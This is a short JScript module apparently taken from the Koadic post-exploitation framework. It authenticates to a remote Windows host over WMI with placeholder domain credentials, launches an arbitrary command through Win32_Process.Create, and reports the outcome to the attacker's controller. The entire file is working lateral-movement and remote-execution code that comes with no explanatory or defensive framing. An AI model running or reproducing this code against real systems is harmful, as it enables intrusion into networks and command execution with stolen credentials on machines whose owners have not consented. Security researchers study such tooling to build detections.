try
{
    var status = -1;

    var objSWbemLocator = new ActiveXObject("WbemScripting.SWbemLocator");


    objSWbemLocator.Security_.ImpersonationLevel = 3;
    objSWbemLocator.Security_.AuthenticationLevel = 6;
    var objSWbemServices = objSWbemLocator.ConnectServer("~RHOST~", "root\\cimv2", "~SMBDOMAIN~\\~SMBUSER~", "~SMBPASS~");

    objSWbemServices.Security_.ImpersonationLevel = 3;
    objSWbemServices.Security_.AuthenticationLevel = 6;

    var intProcessID = 0;
    var objProcess = objSWbemServices.Get("Win32_Process");
    //alert("~CMD~");
    status = objProcess.Create("~CMD~", null, null, intProcessID);

    Koadic.work.report(status);
}
catch (e)
{
    //alert(e.message);
    Koadic.work.report(e.message);
}

Koadic.exit();
